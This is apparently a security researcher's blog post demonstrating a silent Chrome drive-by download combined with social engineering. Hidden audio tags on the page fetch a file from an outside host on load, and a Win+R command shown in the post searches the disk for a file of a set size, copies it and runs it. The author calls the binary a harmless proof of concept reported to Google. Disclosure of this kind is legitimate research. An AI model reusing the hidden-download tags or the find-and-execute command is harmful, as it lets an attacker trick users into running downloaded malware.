---
layout: post
title: Don't run commands you don't really understand
comments: true
---

This demonstrates a fully silent drive-by download in Google Chrome, as well as a social engineering component:
a PoC binary will execute if this seemingly harmless command is entered in a **Win+R** prompt on a Windows system
(Note that you may need to wait for a few seconds before the fun starts):

<pre>
cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
</pre>

<IMG src=https://i.imgur.com/jgmi7XN.png>

Can you figure out how this works?

<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />
<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />

Notes: 

  * The PoC binary is a 100% harmless demo  
  * The chiptune in the PoC is (c) 1987 Jozz
  * Reported to Google in November 2015 (status: Wontfix)

<A href=https://twitter.com/hexatomium>Follow</A> @hexatomium
